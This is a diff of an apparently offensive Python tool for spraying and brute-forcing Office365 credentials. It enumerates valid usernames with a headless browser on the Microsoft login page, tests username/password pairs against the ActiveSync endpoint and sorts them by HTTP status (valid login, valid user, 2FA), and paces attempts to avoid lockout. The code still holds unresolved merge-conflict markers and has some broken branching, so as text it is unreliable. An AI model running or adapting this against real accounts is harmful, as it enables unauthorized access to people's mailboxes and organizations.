@@ -1,10 +1,20 @@
+#!/usr/bin/env python3
+import platform
+import os
+import socket
+import time
+from datetime import datetime
 from argparse import ArgumentParser
+from threading import Thread
 import requests
 import os
 import sys
 import platform
 from colorama import init, Fore
 from time import sleep
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.options import Options
 
 init()
 
@@ -46,34 +56,72 @@ d8888b.  .d88b.  db    db d8b   db d8888b.  .d88b.
         
     
 def brute_office(username,password):
+
+    try:
+        print("Checking credentials {0}:{1}".format(username, password))
+        check_user = check_o365(username)
+        if(check_user == None):
+            print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
+            sys.exit(0)
+        elif (check_user == True):
+            #TODO: run bruter
+            header = {"MS-ASProtocolVersion": "14.0"
+                }
+            LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
+            STATUS_CODES = {"200": "VALID USERPASS",
+                            "401": "VALID USERNAME ONLY",
+                            "403": "VALID USERPASS WITH 2FA",
+                            "404": "INVALID USERNAME"
+                        }
+            r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)
+
+            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
+            print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
+
+        elif(check_user == False):
+            print(Fore.RED+"[+] Error! Invalid username")  
+        else:
+            print(Fore.RED+"[+] Error! Unknown Error")
+            sys.exit(0)
     
-    if check_o365(username):
-        #TODO: run bruter
-        header = {"MS-ASProtocolVersion": "14.0"
-            }
-        LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
-        STATUS_CODES = {"200": "VALID USERPASS",
-                        "401": "VALID USERNAME ONLY",
-                        "403": "VALID USERPASS WITH 2FA",
-                        "404": "INVALID USERNAME"
-                    }
-        r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)
+    except KeyboardInterrupt:
+        print("[!] Detected Ctrl + C. Shutting down...")
         
-        color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
-        print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
-        
-        
-    else:
-        print(Fore.RED+"[+] Error! Unknown error code")
+
 
 def sprayAD(host):
-    #TODO: run AD spray here
+    # TODO: run AD spray here
     pass
 
 def check_o365(username):
-    isO365 = True
-    return isO365
+    domain = username.split('@')[1].replace('.', '-')
+    url_dict = {
+        "Global Office365": ".mail.protection.outlook.com",
+        "other convention for Office365": ".mail.protection." + username
+    }
 
+<<<<<<< HEAD
+=======
+    for line in url_dict:
+        try:
+            socket.gethostbyname(domain + url_dict[line])
+            options = Options()
+            options.add_argument("--headless")
+            driver = webdriver.Chrome(options=options)
+            driver.get("https://login.microsoftonline.com")
+            element = driver.find_element_by_name("loginfmt")
+            element.send_keys(username)
+            element.send_keys(Keys.RETURN)
+            time.sleep(1)
+            try:
+                driver.find_element_by_id("usernameError")
+                return False
+            except:
+                return True
+        except:
+            pass
+
+>>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
 def hybrid_office_worker(policy,user,_pass):
     attempts = 1
     max_attempts, timelimit = tuple(policy.split(','))
@@ -94,7 +142,7 @@ def hybrid_office_worker(policy,user,_pass):
                     sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            exit(0)
+            
             
     elif isinstance(_pass, str):
         #this shows we are spraying a single password against a userfile
@@ -110,8 +158,8 @@ def hybrid_office_worker(policy,user,_pass):
                     sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            exit(0)
-    else:
+            
+    elif isinstance(user, str) and isinstance(_pass, str):
         #this means we are spraying userfile against passfile.
         try:
             with open(_pass, 'r') as passfile, open(user,'r') as userfile:
@@ -120,13 +168,22 @@ def hybrid_office_worker(policy,user,_pass):
                         if attempts == max_attempts:
                             sleep(timelimit)
                             attempts = 1
+<<<<<<< HEAD
                         
+=======
+                        #we can try to use threading here
+>>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
                         brute_office(username.strip("\n"),password.strip("\n"))
                         attempts = attempts + 1
                         sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+<<<<<<< HEAD
             exit(0)
+=======
+    else:
+        print("[!]Unknown mode selected. Check the usage")
+>>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
 
 def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
     #TODO: Run hybrid bruteforcing here using worker threads
@@ -145,7 +202,8 @@ if __name__ == '__main__':
     userfile = options.userfile
     passfile = options.passfile
     policy = options.policy
-
+    verbose = options.verbose
+    
     if username and userfile:
         ArgumentParser().print_usage()
         sys.exit(0)
